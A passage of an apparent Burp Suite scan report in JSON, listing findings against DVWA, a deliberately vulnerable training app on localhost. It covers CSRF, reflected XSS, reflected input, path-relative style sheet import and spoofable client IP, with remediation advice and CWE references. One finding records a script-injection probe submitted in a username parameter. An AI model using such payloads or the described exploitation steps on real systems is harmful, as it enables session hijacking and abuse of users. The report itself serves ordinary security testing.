        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/352.html\">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/62.html\">CAPEC-62: Cross Site Request Forgery</a></li>\\n</ul>",
        "issue__issueDetail": "The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against unauthenticated functionality. This is unlikely to constitute a security vulnerability in its own right, however it may facilitate exploitation of other vulnerabilities affecting application users.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "29": {
        "\ufeffissue__serialNumber": "3.66806E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csrf/test_credentials.php",
        "issue__location": "/dvwa/vulnerabilities/csrf/test_credentials.php [username parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>username</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>zfrbv&lt;script&gt;alert(1)&lt;/script&gt;yn4g4</b> was submitted in the username parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "30": {
        "\ufeffissue__serialNumber": "5.51244E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csrf/test_credentials.php",
        "issue__location": "/dvwa/vulnerabilities/csrf/test_credentials.php [username parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>username</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "31": {
        "\ufeffissue__serialNumber": "5.64464E+17",
        "issue__type": "2098944",
        "issue__name": "Cross-site request forgery",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/javascript/",
        "issue__location": "/dvwa/vulnerabilities/javascript/",
        "issue__severity": "Medium",
        "issue__confidence": "Tentative",
        "issue__issueBackground": "<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>\\n<ul>\\n<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>\\n<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>\\n<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>",
        "issue__remediationBackground": "<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>\\n<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/csrf\">Web Security Academy: Cross-site request forgery</a></li>\\n    <li><a href=\"https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-\">Using Burp to Test for Cross-Site Request Forgery</a></li>\\n    <li><a href=\"https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf\">The Deputies Are Still Confused</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/352.html\">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/62.html\">CAPEC-62: Cross Site Request Forgery</a></li>\\n</ul>",
        "issue__issueDetail": "The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.<br><br>The original request contains parameters that look like they may be anti-CSRF tokens. However the request is successful if these parameters are removed.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "32": {
        "\ufeffissue__serialNumber": "3.90863E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/exec/",
        "issue__location": "/dvwa/vulnerabilities/exec/ [ip parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>ip</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "33": {
        "\ufeffissue__serialNumber": "7.01781E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli_blind/",
        "issue__location": "/dvwa/vulnerabilities/sqli_blind/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "34": {
        "\ufeffissue__serialNumber": "1.52042E+18",
        "issue__type": "4194576",
        "issue__name": "Spoofable client IP address",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>\\nIf an application trusts an HTTP request header like X-Forwarded-For to accurately specify the remote IP address of the connecting client, then malicious clients can spoof their IP address. This behavior does not necessarily constitute a security vulnerability, however some applications use client IP addresses to enforce access controls and rate limits. For example, an application might expose administrative functionality only to clients connecting from the local IP address of the server, or allow a certain number of failed login attempts from each unique IP address.\\nConsider reviewing relevant functionality to determine whether this might be the case. </p>",
        "issue__remediationBackground": "<p>HTTP request headers such as X-Forwarded-For, True-Client-IP, and X-Real-IP are not a robust foundation on which to build any security measures, such as access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to spoofing.</p>\\n<p>If the platform application server returns incorrect information about the client's IP address due to the presence of any particular HTTP request header, then the server may need to be reconfigured, or an alternative method of identifying clients should be used. </p>",
        "issue__references": "",
